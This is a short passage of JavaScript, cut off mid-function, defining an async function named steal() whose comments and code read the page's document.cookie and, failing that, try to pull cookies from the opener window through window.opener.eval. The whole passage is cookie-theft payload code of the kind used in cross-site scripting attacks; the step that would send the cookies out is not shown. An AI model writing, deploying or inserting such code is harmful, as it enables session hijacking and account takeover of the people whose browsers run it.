        async function steal() {
            // Try to get cookies from the current window
            let cookies = document.cookie;
           
            // If empty, try to fetch from the opener (if opened via link)
            if (!cookies && window.opener) {
                try {
                    // This attempts to grab cookies from the parent window if possible
                    // Note: This depends on browser security settings
                    cookies = await window.opener.eval("document.cookie");
